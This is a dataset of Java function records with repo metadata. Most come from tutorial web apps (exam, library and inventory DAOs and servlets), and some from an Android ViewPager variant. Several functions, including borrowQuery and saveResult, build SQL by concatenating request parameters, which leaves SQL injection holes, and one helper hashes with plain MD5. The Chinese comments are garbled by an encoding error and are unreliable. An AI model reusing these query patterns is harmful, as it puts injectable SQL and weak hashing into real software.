{"docstring": "//\u053d\udb86\udcf4\u6ffc\u053d\n", "func_signal": "public int saveResult(String studentID,int lessonID,int resSingle,int resMore)", "code": "{\n\tString lesson=((LessonForm)lessonDAO.query(lessonID).get(0)).getName();\n\tString sql=\"UPDATE tb_stuResult set resSingle=\"+resSingle+\",resMore=\"+resMore+\" WHERE stuId='\"+studentID+\"' AND whichLesson='\"+lesson+\"'\";\n\tSystem.out.println(sql);\n\tint ret=conn.executeUpdate(sql);\n\treturn ret;\n}", "path": "06\\src\\com\\wgh\\dao\\StartExamDAO.java", "repo_name": "maxliaops/Java_Web_Examples", "stars": 587, "license": "None", "language": "java", "size": 105216}
{"docstring": "//\u0221\n", "func_signal": "public int randomGetQuestion(int lessonID)", "code": "{\n\tint questionsID=0;\n\tString sql=\"SELECT taoTiID FROM (SELECT distinct lessonID,taoTiID from \" +\n\t\t\t\"(SELECT lessonId,taoTiID FROM tb_questions GROUP BY taoTiID,lessonID,type)\" +\n\t\t\t\" as lessonTaoTi GROUP BY lessonId,taoTiID having count(taoTiID) >1)as temp\" +\n\t\t\t\" WHERE lessonID=\"+lessonID+\"\";\n\tResultSet rs = conn.executeQuery(sql);\n\tint i=0;\n    try {\n    \trs.last();\n    \tint recordNum=rs.getRow();\n    \trs.first();\n    \tint[] id=new int[recordNum];\n        do {\n            id[i]=rs.getInt(1);\n            i++;\n        }while (rs.next());\n        int rand=Math.abs(new Random().nextInt(id.length));\n        questionsID=id[rand];\n    } catch (Exception ex) {\n    \tex.printStackTrace();\n    }    \t\n\treturn questionsID;\n}", "path": "06\\src\\com\\wgh\\dao\\StartExamDAO.java", "repo_name": "maxliaops/Java_Web_Examples", "stars": 587, "license": "None", "language": "java", "size": 105216}
{"docstring": "//\u057f\u02bc\u02b1\u6ffc\u053d\n", "func_signal": "public int startSaveResult(String studentID,int lessonID)", "code": "{\n\tString lesson=((LessonForm)lessonDAO.query(lessonID).get(0)).getName();\n\tString sql=\"INSERT INTO tb_stuResult (stuId,whichLesson,resSingle,resMore) values('\"+studentID+\"','\"+lesson+\"',0,0)\";\n\tSystem.out.println(\"\u057f\u02bc\u02b1\u6ffc\u053dSQL\u48fa\"+sql);\n\tint ret=conn.executeUpdate(sql);\n\treturn ret;\n}", "path": "06\\src\\com\\wgh\\dao\\StartExamDAO.java", "repo_name": "maxliaops/Java_Web_Examples", "stars": 587, "license": "None", "language": "java", "size": 105216}
{"docstring": "/*********************\u037c\u9ef9***********************/\n", "func_signal": "private void bookback(HttpServletRequest request, HttpServletResponse response)\n\tthrows ServletException, IOException", "code": "{\n    //\u046f\u03e2\n    readerForm.setBarcode(request.getParameter(\"barcode\"));\n    ReaderForm reader = (ReaderForm) readerDAO.queryM(readerForm);\n    request.setAttribute(\"readerinfo\", reader);\n    //\u046f\u07f5\u013d\u03e2\n    request.setAttribute(\"borrowinfo\",borrowDAO.borrowinfo(request.getParameter(\"barcode\")));\n     if(request.getParameter(\"id\")!=null){\n         int id = Integer.parseInt(request.getParameter(\"id\"));\n         String operator=request.getParameter(\"operator\");\n         if (id > 0) { //\u05b4\u0439\u9ef9\n             int ret = borrowDAO.back(id,operator);\n             if (ret == 0) {\n                 request.setAttribute(\"error\", \"\u037c\u9ef9\u02a7!\");\n                 request.getRequestDispatcher(\"error.jsp\").forward(request, response);\n             } else {\n                 request.setAttribute(\"bar\", request.getParameter(\"barcode\"));\n                 request.getRequestDispatcher(\"bookBack_ok.jsp\").forward(request, response);\n             }\n         }\n     }else{\n    \t request.getRequestDispatcher(\"bookBack.jsp\").forward(request, response);\n     }\n}", "path": "12\\src\\com\\action\\Borrow.java", "repo_name": "maxliaops/Java_Web_Examples", "stars": 587, "license": "None", "language": "java", "size": 105216}
{"docstring": "//\u02f2\u03f8\n", "func_signal": "public ActionForward uneligible(ActionMapping mapping,ActionForm form,HttpServletRequest request,HttpServletResponse response)", "code": "{\n    HttpSession httpsession = request.getSession();\n    if(httpsession.getAttribute(\"username\")==null){\n        request.setAttribute(\"error\",\"\u0235\u00bc\");\n        return mapping.findForward(\"error\");\n    }\n    int id=Integer.valueOf(request.getParameter(\"id\"));\n    int rtn=instorageDAO.uneligibleAdd(id,request);\n    if(rtn==1){\n        return mapping.findForward(\"eligibleAddok\");\n    }else{\n        request.setAttribute(\"error\",\"\u02f2\u03f8\u02a7\u0723\");\n        return mapping.findForward(\"error\");\n    }\n}", "path": "07\\src\\com\\action\\Instorage.java", "repo_name": "maxliaops/Java_Web_Examples", "stars": 587, "license": "None", "language": "java", "size": 105216}
{"docstring": "//\u04bb\u00bc\n", "func_signal": "public Condb()", "code": "{\n\t\ttry{\n\t\t\tClass.forName(driverClass);//classforname\n\t\t\tcon = DriverManager.getConnection(url);\n\t\t}catch(Exception e){\n\t\t\tSystem.err.println(e);\n\t\t}\n\t\t\n\t}", "path": "21\\src\\com\\bwm\\db\\Condb.java", "repo_name": "maxliaops/Java_Web_Examples", "stars": 587, "license": "None", "language": "java", "size": 105216}
{"docstring": "/*********************\u037c***********************/\n", "func_signal": "private void bookBorrowSort(HttpServletRequest request, HttpServletResponse response)\n\tthrows ServletException, IOException", "code": "{\n    request.setAttribute(\"bookBorrowSort\",borrowDAO.bookBorrowSort());\n    request.getRequestDispatcher(\"bookBorrowSort.jsp\").forward(request, response);\n}", "path": "12\\src\\com\\action\\Borrow.java", "repo_name": "maxliaops/Java_Web_Examples", "stars": 587, "license": "None", "language": "java", "size": 105216}
{"docstring": "//\n", "func_signal": "public ActionForward eligible(ActionMapping mapping,ActionForm form,HttpServletRequest request,HttpServletResponse response)", "code": "{\n    HttpSession httpsession = request.getSession();\n    if(httpsession.getAttribute(\"username\")==null){\n        request.setAttribute(\"error\",\"\u0235\u00bc\");\n        return mapping.findForward(\"error\");\n    }\n    int id=Integer.valueOf(request.getParameter(\"id\"));\n    int rtn=instorageDAO.eligibleAdd(id,request);\n    if(rtn==1){\n        return mapping.findForward(\"eligibleAddok\");\n    }else{\n        request.setAttribute(\"error\",\"\u02a7\u0723\");\n        return mapping.findForward(\"error\");\n    }\n}", "path": "07\\src\\com\\action\\Instorage.java", "repo_name": "maxliaops/Java_Web_Examples", "stars": 587, "license": "None", "language": "java", "size": 105216}
{"docstring": "/*********************\u037c\u0132\u046f***********************/\n", "func_signal": "private void borrowQuery(HttpServletRequest request, HttpServletResponse response)\n\tthrows ServletException, IOException", "code": "{\n       String str=null;\n       String flag[]=request.getParameterValues(\"flag\");\n       if (flag!=null){\n           String aa = flag[0];\n           if (\"a\".equals(aa)) {\n               if (request.getParameter(\"f\") != null) {\n                   str = request.getParameter(\"f\") + \" like '%\" +\n                         request.getParameter(\"key\") + \"%'\";\n               }\n           }\n           if (\"b\".equals(aa)) {\n               String sdate = request.getParameter(\"sdate\");\n               String edate = request.getParameter(\"edate\");\n               if (sdate != null && edate != null) {\n                   str = \"borrowTime between '\" + sdate + \"' and '\" + edate +\n                         \"'\";\n               }\n               System.out.println(\"\" + str);\n           }\n           //\u036c\u02b1\u0461\u06ba\u0432\u046f\n           if (flag.length == 2) {\n               if (request.getParameter(\"f\") != null) {\n                   str = request.getParameter(\"f\") + \" like '%\" +\n                         request.getParameter(\"key\") + \"%'\";\n               }\n               System.out.println(\"\u06ba\");\n               String sdate = request.getParameter(\"sdate\");\n               String edate = request.getParameter(\"edate\");\n               String str1 = null;\n               if (sdate != null && edate != null) {\n                   str1 = \"borrowTime between '\" + sdate + \"' and '\" + edate +\n                          \"'\";\n               }\n               str = str + \" and borr.\" + str1;\n               System.out.println(\"\u06a3\" + str);\n           }\n       }\n       request.setAttribute(\"borrowQuery\",borrowDAO.borrowQuery(str));\n      System.out.print(\"\u046f\u037c\u03e2\u02b1str:\"+str);\n      request.getRequestDispatcher(\"borrowQuery.jsp\").forward(request, response);\n   }", "path": "12\\src\\com\\action\\Borrow.java", "repo_name": "maxliaops/Java_Web_Examples", "stars": 587, "license": "None", "language": "java", "size": 105216}
{"docstring": "/**\u077f*/\n", "func_signal": "public Connection getCon()", "code": "{\n\tif(con==null){\n\t\ttry {\n\t\t\tcon=DriverManager.getConnection(url,user,password);\n\t\t} catch (SQLException e) {\n\t\t\tSystem.out.println(\"\u077f\u02a7\u0723\");\n\t\t\tcon=null;\n\t\t\te.printStackTrace();\n\t\t}\t\t\t\n\t}\n\treturn con;\n}", "path": "15\\src\\com\\toolsBean\\DB.java", "repo_name": "maxliaops/Java_Web_Examples", "stars": 587, "license": "None", "language": "java", "size": 105216}
{"docstring": "// \u0423Email\u05b7\n", "func_signal": "public static boolean checkemail(String email)", "code": "{\n\tString regex = \"[a-zA-Z][\\\\w_]+@\\\\w+(\\\\.\\\\w+)+\";\n\tPattern p = Pattern.compile(regex);\n\tMatcher m = p.matcher(email);\n\treturn m.matches();\n}", "path": "03\\src\\com\\mr\\tools\\ValidateExpression.java", "repo_name": "maxliaops/Java_Web_Examples", "stars": 587, "license": "None", "language": "java", "size": 105216}
{"docstring": "/** \ucdfd\u06b8\u00f7\u043c\u077f  */\n", "func_signal": "public DB()", "code": "{\n\ttry{\n\t\tClass.forName(className);\n\t}catch(ClassNotFoundException e){\n\t\tSystem.out.println(\"\u077f\u02a7\u0723\");\n\t\te.printStackTrace();\n\t}\n}", "path": "15\\src\\com\\toolsBean\\DB.java", "repo_name": "maxliaops/Java_Web_Examples", "stars": 587, "license": "None", "language": "java", "size": 105216}
{"docstring": "// MD5\n", "func_signal": "public static String encodeMD5(String str)", "code": "{\n\tif (str == null) {\n\t\treturn null;\n\t}\n\tStringBuilder sb = new StringBuilder();\n\ttry {\n\t\tMessageDigest code = MessageDigest.getInstance(\"MD5\");\n\t\tcode.update(str.getBytes());\n\t\tbyte[] bs = code.digest();\n\t\tfor (int i = 0; i < bs.length; i++) {\n\t\t\tint v = bs[i] & 0xFF;\n\t\t\tif (v < 16) {\n\t\t\t\tsb.append(0);\n\t\t\t}\n\t\t\tsb.append(Integer.toHexString(v));\n\t\t}\n\t} catch (NoSuchAlgorithmException e) {\n\t\te.printStackTrace();\n\t}\n\treturn sb.toString().toUpperCase();\n}", "path": "03\\src\\com\\mr\\tools\\ValidateExpression.java", "repo_name": "maxliaops/Java_Web_Examples", "stars": 587, "license": "None", "language": "java", "size": 105216}
{"docstring": "//\u0279\u03e2\n", "func_signal": "public ActionForward stockadd(ActionMapping mapping, ActionForm form,\n                             HttpServletRequest request,\n                             HttpServletResponse response)", "code": "{\n    StockMainForm stockMainForm=(StockMainForm)form;\n    int rtn=instorageDAO.stockadd(stockMainForm,request);\n    if(rtn==1){\n        return mapping.findForward(\"stockaddok\");\n    }else{\n        request.setAttribute(\"error\",\"\u0279\u03e2\u02a7\u0723\");\n        return mapping.findForward(\"error\");\n    }\n}", "path": "07\\src\\com\\action\\Instorage.java", "repo_name": "maxliaops/Java_Web_Examples", "stars": 587, "license": "None", "language": "java", "size": 105216}
{"docstring": "/**\n * @\u0723\u0377PrepareStatementConnection\n */\n", "func_signal": "public void closed()", "code": "{\n\ttry{\n\t\tif(pstm!=null)\n\t\t\tpstm.close();\t\t\t\n\t}catch(SQLException e){\n\t\tSystem.out.println(\"\u0631pstm\u02a7\u0723\");\n\t\te.printStackTrace();\n\t}\n\ttry{\n\t\tif(con!=null){\n\t\t\tcon.close();\n\t\t}\n\t}catch(SQLException e){\n\t\tSystem.out.println(\"\u0631con\u02a7\u0723\");\n\t\te.printStackTrace();\n\t}\n}", "path": "15\\src\\com\\toolsBean\\DB.java", "repo_name": "maxliaops/Java_Web_Examples", "stars": 587, "license": "None", "language": "java", "size": 105216}
{"docstring": "/*********************\u037c\u033d***********************/\n", "func_signal": "private void bookrenew(HttpServletRequest request, HttpServletResponse response)\n\tthrows ServletException, IOException", "code": "{\n    //\u046f\u03e2\n    readerForm.setBarcode(request.getParameter(\"barcode\"));\n    ReaderForm reader = (ReaderForm) readerDAO.queryM(readerForm);\n    request.setAttribute(\"readerinfo\", reader);\n    //\u046f\u07f5\u013d\u03e2\n    request.setAttribute(\"borrowinfo\",borrowDAO.borrowinfo(request.getParameter(\"barcode\")));\n     if(request.getParameter(\"id\")!=null){\n         int id = Integer.parseInt(request.getParameter(\"id\"));\n         if (id > 0) { //\u05b4\u043c\u033d\n             int ret = borrowDAO.renew(id);\n             if (ret == 0) {\n                 request.setAttribute(\"error\", \"\u037c\u033d\u02a7!\");\n                 request.getRequestDispatcher(\"error.jsp\").forward(request, response);\n             } else {\n                 request.setAttribute(\"bar\", request.getParameter(\"barcode\"));\n                 request.getRequestDispatcher(\"bookRenew_ok.jsp\").forward(request, response);\n             }\n         }\n     }else{\n    \t request.getRequestDispatcher(\"bookRenew.jsp\").forward(request, response);\n     }\n}", "path": "12\\src\\com\\action\\Borrow.java", "repo_name": "maxliaops/Java_Web_Examples", "stars": 587, "license": "None", "language": "java", "size": 105216}
{"docstring": "/**\n *@\u0723\u077f\u027e\u0121\n *@sql\u03aaSQL\u48fbparams\u03aaObject\u98ec\u6d22\u03aasql\u02beSQL\"?\"\u057c\u03bb\u05b5 \n */\n", "func_signal": "public void doPstm(String sql,Object[] params)", "code": "{\n\tif(sql!=null&&!sql.equals(\"\")){\n\t\tif(params==null)\n\t\t\tparams=new Object[0];\t\t\t\n\t\tgetCon();\n\t\tif(con!=null){\n\t\t\ttry{\t\t\n\t\t\t\tSystem.out.println(sql);\n\t\t\t\tpstm=con.prepareStatement(sql,ResultSet.TYPE_SCROLL_INSENSITIVE,ResultSet.CONCUR_READ_ONLY);\n\t\t\t\tfor(int i=0;i<params.length;i++){\n\t\t\t\t\tpstm.setObject(i+1,params[i]);\n\t\t\t\t}\n\t\t\t\tpstm.execute();\n\t\t\t}catch(SQLException e){\n\t\t\t\tSystem.out.println(\"doPstm()\");\n\t\t\t\te.printStackTrace();\n\t\t\t}\t\t\t\t\n\t\t}\t\t\t\n\t}\n}", "path": "15\\src\\com\\toolsBean\\DB.java", "repo_name": "maxliaops/Java_Web_Examples", "stars": 587, "license": "None", "language": "java", "size": 105216}
{"docstring": "//\u0461\u05b8\u03e2\u0132\u046f\n", "func_signal": "public ActionForward changeGoods(ActionMapping mapping, ActionForm form,\n                             HttpServletRequest request,\n                             HttpServletResponse response)", "code": "{\n    GoodsDAO goodsDAO=new GoodsDAO();\n    int goodsid=1;\n    if(request.getParameter(\"id\")!=null){\n        goodsid=Integer.parseInt(request.getParameter(\"id\"));\n    }\n    request.setAttribute(\"selGoods\",goodsDAO.query(goodsid));   //\u0221\u0461\u03e2\n    return mapping.findForward(\"stock\");\n}", "path": "07\\src\\com\\action\\Instorage.java", "repo_name": "maxliaops/Java_Web_Examples", "stars": 587, "license": "None", "language": "java", "size": 105216}
{"docstring": "/******************************************************************************************/\n", "func_signal": "public void doGet(HttpServletRequest request, HttpServletResponse response)\n\tthrows ServletException, IOException", "code": "{\n        String action =request.getParameter(\"action\");\n        if(action==null||\"\".equals(action)){\n            request.setAttribute(\"error\",\"\u0132\");\n            request.getRequestDispatcher(\"error.jsp\").forward(request, response);\n        }else if(\"bookBorrowSort\".equals(action)){\n            bookBorrowSort(request,response); \n        }else if(\"bookborrow\".equals(action)){\n            bookborrow(request,response);  //\u037c\n        }else if(\"bookrenew\".equals(action)){\n            bookrenew(request,response);  //\u037c\n        }else if(\"bookback\".equals(action)){\n            bookback(request,response);  //\u037c\u9ef9\n        }else if(\"Bremind\".equals(action)){\n            bremind(request,response);  //\u0135\n        }else if(\"borrowQuery\".equals(action)){\n            borrowQuery(request,response);  //\u03e2\u046f\n        }\n    }", "path": "12\\src\\com\\action\\Borrow.java", "repo_name": "maxliaops/Java_Web_Examples", "stars": 587, "license": "None", "language": "java", "size": 105216}
{"docstring": "/**\n * We only want the current page that is being shown to be focusable.\n */\n", "func_signal": "@Override\npublic void addFocusables(ArrayList<View> views, int direction, int focusableMode)", "code": "{\n    final int focusableCount = views.size();\n\n    final int descendantFocusability = getDescendantFocusability();\n\n    if (descendantFocusability != FOCUS_BLOCK_DESCENDANTS) {\n        for (int i = 0; i < getChildCount(); i++) {\n            final View child = getChildAt(i);\n            if (child.getVisibility() == VISIBLE) {\n                ItemInfo ii = infoForChild(child);\n                if (ii != null && ii.position == mCurItem) {\n                    child.addFocusables(views, direction, focusableMode);\n                }\n            }\n        }\n    }\n\n    // we add ourselves (if focusable) in all cases except for when we are\n    // FOCUS_AFTER_DESCENDANTS and there are some descendants focusable.  this is\n    // to avoid the focus search finding layouts when a more precise search\n    // among the focusable children would be more interesting.\n    if (\n            descendantFocusability != FOCUS_AFTER_DESCENDANTS ||\n                    // No focusable descendants\n                    (focusableCount == views.size())) {\n        // Note that we can't call the superclass here, because it will\n        // add all views in.  So we need to do the same thing View does.\n        if (!isFocusable()) {\n            return;\n        }\n        if ((focusableMode & FOCUSABLES_TOUCH_MODE) == FOCUSABLES_TOUCH_MODE &&\n                isInTouchMode() && !isFocusableInTouchMode()) {\n            return;\n        }\n        if (views != null) {\n            views.add(this);\n        }\n    }\n}", "path": "coverflow\\src\\main\\java\\android\\support\\v4\\view\\LinkagePager.java", "repo_name": "crosswall/Android-Coverflow", "stars": 917, "license": "other", "language": "java", "size": 2348}
{"docstring": "/**\n * End a fake drag of the pager.\n *\n * @see #beginFakeDrag()\n * @see #fakeDragBy(float)\n */\n", "func_signal": "public void endFakeDrag()", "code": "{\n    if (!mFakeDragging) {\n        throw new IllegalStateException(\"No fake drag in progress. Call beginFakeDrag first.\");\n    }\n\n    if (mAdapter != null) {\n        final VelocityTracker velocityTracker = mVelocityTracker;\n        velocityTracker.computeCurrentVelocity(1000, mMaximumVelocity);\n        int initialVelocity = (int) VelocityTrackerCompat.getXVelocity(\n                velocityTracker, mActivePointerId);\n        mPopulatePending = true;\n        final int width = getClientWidth();\n        final int scrollX = getScrollX();\n        final ItemInfo ii = infoForCurrentScrollPosition();\n        final int currentPage = ii.position;\n        final float pageOffset = (((float) scrollX / width) - ii.offset) / ii.widthFactor;\n        final int totalDelta = (int) (mLastMotionX - mInitialMotionX);\n        int nextPage = determineTargetPage(currentPage, pageOffset, initialVelocity,\n                totalDelta);\n        setCurrentItemInternal(nextPage, true, true, initialVelocity);\n    }\n    endDrag();\n\n    mFakeDragging = false;\n}", "path": "coverflow\\src\\main\\java\\android\\support\\v4\\view\\LinkagePager.java", "repo_name": "crosswall/Android-Coverflow", "stars": 917, "license": "other", "language": "java", "size": 2348}
{"docstring": "/**\n * Set the number of pages that should be retained to either side of the\n * current page in the view hierarchy in an idle state. Pages beyond this\n * limit will be recreated from the adapter when needed.\n *\n * <p>This is offered as an optimization. If you know in advance the number\n * of pages you will need to support or have lazy-loading mechanisms in place\n * on your pages, tweaking this setting can have benefits in perceived smoothness\n * of paging animations and interaction. If you have a small number of pages (3-4)\n * that you can keep active all at once, less time will be spent in layout for\n * newly created view subtrees as the user pages back and forth.</p>\n *\n * <p>You should keep this limit low, especially if your pages have complex layouts.\n * This setting defaults to 1.</p>\n *\n * @param limit How many pages will be kept offscreen in an idle state.\n */\n", "func_signal": "public void setOffscreenPageLimit(int limit)", "code": "{\n    if (limit < DEFAULT_OFFSCREEN_PAGES) {\n        Log.w(TAG, \"Requested offscreen page limit \" + limit + \" too small; defaulting to \" +\n                DEFAULT_OFFSCREEN_PAGES);\n        limit = DEFAULT_OFFSCREEN_PAGES;\n    }\n    if (limit != mOffscreenPageLimit) {\n        mOffscreenPageLimit = limit;\n        populate();\n    }\n}", "path": "coverflow\\src\\main\\java\\android\\support\\v4\\view\\LinkagePager.java", "repo_name": "crosswall/Android-Coverflow", "stars": 917, "license": "other", "language": "java", "size": 2348}
{"docstring": "/**\n * Set a PagerAdapter that will supply views for this pager as needed.\n *\n * @param adapter Adapter to use\n */\n", "func_signal": "public void setAdapter(PagerAdapter adapter)", "code": "{\n    if (mAdapter != null) {\n        mAdapter.setViewPagerObserver(null);\n        mAdapter.startUpdate(this);\n        for (int i = 0; i < mItems.size(); i++) {\n            final ItemInfo ii = mItems.get(i);\n            mAdapter.destroyItem(this, ii.position, ii.object);\n        }\n        mAdapter.finishUpdate(this);\n        mItems.clear();\n        removeNonDecorViews();\n        mCurItem = 0;\n        scrollTo(0, 0);\n    }\n\n    final PagerAdapter oldAdapter = mAdapter;\n    mAdapter = adapter;\n    mExpectedAdapterCount = 0;\n\n    if (mAdapter != null) {\n        if (mObserver == null) {\n            mObserver = new PagerObserver();\n        }\n        mAdapter.setViewPagerObserver(mObserver);\n        mPopulatePending = false;\n        final boolean wasFirstLayout = mFirstLayout;\n        mFirstLayout = true;\n        mExpectedAdapterCount = mAdapter.getCount();\n        if (mRestoredCurItem >= 0) {\n            mAdapter.restoreState(mRestoredAdapterState, mRestoredClassLoader);\n            setCurrentItemInternal(mRestoredCurItem, false, true);\n            mRestoredCurItem = -1;\n            mRestoredAdapterState = null;\n            mRestoredClassLoader = null;\n        } else if (!wasFirstLayout) {\n            populate();\n        } else {\n            requestLayout();\n        }\n    }\n\n    if (mAdapterChangeListener != null && oldAdapter != adapter) {\n        mAdapterChangeListener.onAdapterChanged(oldAdapter, adapter);\n    }\n}", "path": "coverflow\\src\\main\\java\\android\\support\\v4\\view\\LinkagePager.java", "repo_name": "crosswall/Android-Coverflow", "stars": 917, "license": "other", "language": "java", "size": 2348}
{"docstring": "/**\n * Set a drawable that will be used to fill the margin between pages.\n *\n * @param d Drawable to display between pages\n */\n", "func_signal": "public void setPageMarginDrawable(Drawable d)", "code": "{\n    mMarginDrawable = d;\n    if (d != null) refreshDrawableState();\n    setWillNotDraw(d == null);\n    invalidate();\n}", "path": "coverflow\\src\\main\\java\\android\\support\\v4\\view\\LinkagePager.java", "repo_name": "crosswall/Android-Coverflow", "stars": 917, "license": "other", "language": "java", "size": 2348}
{"docstring": "/**\n * We only want the current page that is being shown to be focusable.\n */\n", "func_signal": "@Override\nprotected boolean onRequestFocusInDescendants(int direction,\n                                              Rect previouslyFocusedRect)", "code": "{\n    int index;\n    int increment;\n    int end;\n    int count = getChildCount();\n    if ((direction & FOCUS_FORWARD) != 0) {\n        index = 0;\n        increment = 1;\n        end = count;\n    } else {\n        index = count - 1;\n        increment = -1;\n        end = -1;\n    }\n    for (int i = index; i != end; i += increment) {\n        View child = getChildAt(i);\n        if (child.getVisibility() == VISIBLE) {\n            ItemInfo ii = infoForChild(child);\n            if (ii != null && ii.position == mCurItem) {\n                if (child.requestFocus(direction, previouslyFocusedRect)) {\n                    return true;\n                }\n            }\n        }\n    }\n    return false;\n}", "path": "coverflow\\src\\main\\java\\android\\support\\v4\\view\\LinkagePager.java", "repo_name": "crosswall/Android-Coverflow", "stars": 917, "license": "other", "language": "java", "size": 2348}
{"docstring": "/**\n * Start a fake drag of the pager.\n *\n * <p>A fake drag can be useful if you want to synchronize the motion of the ViewPager\n * with the touch scrolling of another view, while still letting the ViewPager\n * control the snapping motion and fling behavior. (e.g. parallax-scrolling tabs.)\n * Call {@link #fakeDragBy(float)} to simulate the actual drag motion. Call\n * {@link #endFakeDrag()} to complete the fake drag and fling as necessary.\n *\n * <p>During a fake drag the ViewPager will ignore all touch events. If a real drag\n * is already in progress, this method will return false.\n *\n * @return true if the fake drag began successfully, false if it could not be started.\n *\n * @see #fakeDragBy(float)\n * @see #endFakeDrag()\n */\n", "func_signal": "public boolean beginFakeDrag()", "code": "{\n    if (mIsBeingDragged) {\n        return false;\n    }\n    mFakeDragging = true;\n    setScrollState(SCROLL_STATE_DRAGGING);\n    mInitialMotionX = mLastMotionX = 0;\n    if (mVelocityTracker == null) {\n        mVelocityTracker = VelocityTracker.obtain();\n    } else {\n        mVelocityTracker.clear();\n    }\n    final long time = SystemClock.uptimeMillis();\n    final MotionEvent ev = MotionEvent.obtain(time, time, MotionEvent.ACTION_DOWN, 0, 0, 0);\n    mVelocityTracker.addMovement(ev);\n    ev.recycle();\n    mFakeDragBeginTime = time;\n    return true;\n}", "path": "coverflow\\src\\main\\java\\android\\support\\v4\\view\\LinkagePager.java", "repo_name": "crosswall/Android-Coverflow", "stars": 917, "license": "other", "language": "java", "size": 2348}
{"docstring": "/**\n * Fake drag by an offset in pixels. You must have called {@link #beginFakeDrag()} first.\n *\n * @param xOffset Offset in pixels to drag by.\n * @see #beginFakeDrag()\n * @see #endFakeDrag()\n */\n", "func_signal": "public void fakeDragBy(float xOffset)", "code": "{\n    if (!mFakeDragging) {\n        throw new IllegalStateException(\"No fake drag in progress. Call beginFakeDrag first.\");\n    }\n\n    if (mAdapter == null) {\n        return;\n    }\n\n    mLastMotionX += xOffset;\n\n    float oldScrollX = getScrollX();\n    float scrollX = oldScrollX - xOffset;\n    final int width = getClientWidth();\n\n    float leftBound = width * mFirstOffset;\n    float rightBound = width * mLastOffset;\n\n    final ItemInfo firstItem = mItems.get(0);\n    final ItemInfo lastItem = mItems.get(mItems.size() - 1);\n    if (firstItem.position != 0) {\n        leftBound = firstItem.offset * width;\n    }\n    if (lastItem.position != mAdapter.getCount() - 1) {\n        rightBound = lastItem.offset * width;\n    }\n\n    if (scrollX < leftBound) {\n        scrollX = leftBound;\n    } else if (scrollX > rightBound) {\n        scrollX = rightBound;\n    }\n    // Don't lose the rounded component\n    mLastMotionX += scrollX - (int) scrollX;\n    scrollTo((int) scrollX, getScrollY());\n    pageScrolled((int) scrollX);\n\n    // Synthesize an event for the VelocityTracker.\n    final long time = SystemClock.uptimeMillis();\n    final MotionEvent ev = MotionEvent.obtain(mFakeDragBeginTime, time, MotionEvent.ACTION_MOVE,\n            mLastMotionX, 0, 0);\n    mVelocityTracker.addMovement(ev);\n    ev.recycle();\n}", "path": "coverflow\\src\\main\\java\\android\\support\\v4\\view\\LinkagePager.java", "repo_name": "crosswall/Android-Coverflow", "stars": 917, "license": "other", "language": "java", "size": 2348}
{"docstring": "/**\n * Tests scrollability within child views of v given a delta of dx.\n *\n * @param v View to test for horizontal scrollability\n * @param checkV Whether the view v passed should itself be checked for scrollability (true),\n *               or just its children (false).\n * @param dx Delta scrolled in pixels\n * @param x X coordinate of the active touch point\n * @param y Y coordinate of the active touch point\n * @return true if child views of v can be scrolled by delta of dx.\n */\n", "func_signal": "protected boolean canScroll(View v, boolean checkV, int dx, int x, int y)", "code": "{\n    if (v instanceof ViewGroup) {\n        final ViewGroup group = (ViewGroup) v;\n        final int scrollX = v.getScrollX();\n        final int scrollY = v.getScrollY();\n        final int count = group.getChildCount();\n        // Count backwards - let topmost views consume scroll distance first.\n        for (int i = count - 1; i >= 0; i--) {\n            // TODO: Add versioned support here for transformed views.\n            // This will not work for transformed views in Honeycomb+\n            final View child = group.getChildAt(i);\n            if (x + scrollX >= child.getLeft() && x + scrollX < child.getRight() &&\n                    y + scrollY >= child.getTop() && y + scrollY < child.getBottom() &&\n                    canScroll(child, true, dx, x + scrollX - child.getLeft(),\n                            y + scrollY - child.getTop())) {\n                return true;\n            }\n        }\n    }\n\n    return checkV && ViewCompat.canScrollHorizontally(v, -dx);\n}", "path": "coverflow\\src\\main\\java\\android\\support\\v4\\view\\LinkagePager.java", "repo_name": "crosswall/Android-Coverflow", "stars": 917, "license": "other", "language": "java", "size": 2348}
{"docstring": "/**\n * This method will be invoked when the current page is scrolled, either as part\n * of a programmatically initiated smooth scroll or a user initiated touch scroll.\n * If you override this method you must call through to the superclass implementation\n * (e.g. super.onPageScrolled(position, offset, offsetPixels)) before onPageScrolled\n * returns.\n *\n * @param position Position index of the first page currently being displayed.\n *                 Page position+1 will be visible if positionOffset is nonzero.\n * @param offset Value from [0, 1) indicating the offset from the page at position.\n * @param offsetPixels Value in pixels indicating the offset from position.\n */\n", "func_signal": "@CallSuper\nprotected void onPageScrolled(int position, float offset, int offsetPixels)", "code": "{\n    // Offset any decor views if needed - keep them on-screen at all times.\n    if (mDecorChildCount > 0) {\n        final int scrollX = getScrollX();\n        int paddingLeft = getPaddingLeft();\n        int paddingRight = getPaddingRight();\n        final int width = getWidth();\n        final int childCount = getChildCount();\n        for (int i = 0; i < childCount; i++) {\n            final View child = getChildAt(i);\n            final LayoutParams lp = (LayoutParams) child.getLayoutParams();\n            if (!lp.isDecor) continue;\n\n            final int hgrav = lp.gravity & Gravity.HORIZONTAL_GRAVITY_MASK;\n            int childLeft = 0;\n            switch (hgrav) {\n                default:\n                    childLeft = paddingLeft;\n                    break;\n                case Gravity.LEFT:\n                    childLeft = paddingLeft;\n                    paddingLeft += child.getWidth();\n                    break;\n                case Gravity.CENTER_HORIZONTAL:\n                    childLeft = Math.max((width - child.getMeasuredWidth()) / 2,\n                            paddingLeft);\n                    break;\n                case Gravity.RIGHT:\n                    childLeft = width - paddingRight - child.getMeasuredWidth();\n                    paddingRight += child.getMeasuredWidth();\n                    break;\n            }\n            childLeft += scrollX;\n\n            final int childOffset = childLeft - child.getLeft();\n            if (childOffset != 0) {\n                child.offsetLeftAndRight(childOffset);\n            }\n        }\n    }\n\n    dispatchOnPageScrolled(position, offset, offsetPixels);\n\n    if (mPageTransformer != null) {\n        final int scrollX = getScrollX();\n        final int childCount = getChildCount();\n        for (int i = 0; i < childCount; i++) {\n            final View child = getChildAt(i);\n            final LayoutParams lp = (LayoutParams) child.getLayoutParams();\n\n            if (lp.isDecor) continue;\n            final float transformPos = (float) (child.getLeft() - scrollX) / getClientWidth();\n            mPageTransformer.transformPage(child, transformPos);\n        }\n    }\n\n    mCalledSuper = true;\n}", "path": "coverflow\\src\\main\\java\\android\\support\\v4\\view\\LinkagePager.java", "repo_name": "crosswall/Android-Coverflow", "stars": 917, "license": "other", "language": "java", "size": 2348}
